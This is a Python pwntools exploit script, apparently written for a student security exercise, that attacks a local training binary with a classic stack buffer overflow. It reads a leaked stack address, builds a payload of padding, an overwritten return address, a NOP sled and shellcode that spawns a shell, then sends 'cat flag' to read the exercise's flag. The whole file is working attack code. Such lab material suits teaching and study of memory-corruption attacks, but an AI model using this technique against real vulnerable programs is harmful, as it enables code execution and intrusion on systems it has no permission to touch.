#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise2/exercise2b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
buffer_address = r.recvline()  ## top of stack
print(buffer_address)  ## looks like something like this b'0x7ffe5df12290\n'
buffer_address = int(buffer_address.decode(), base=16)

"""
shellcode
nops
return_address (point to nops)
esp
buffer
"""

padding = b"A" * 16
return_address = p64(buffer_address + 16 + 8) # saved return address + 8
nop = b"\x90" * 100  # insert some null ops
shellcode = asm(shellcraft.amd64.linux.sh())

command = padding + return_address + nop + shellcode
r.sendline(command)
r.sendline(b"cat flag")

print(r.recvall(timeout=3))


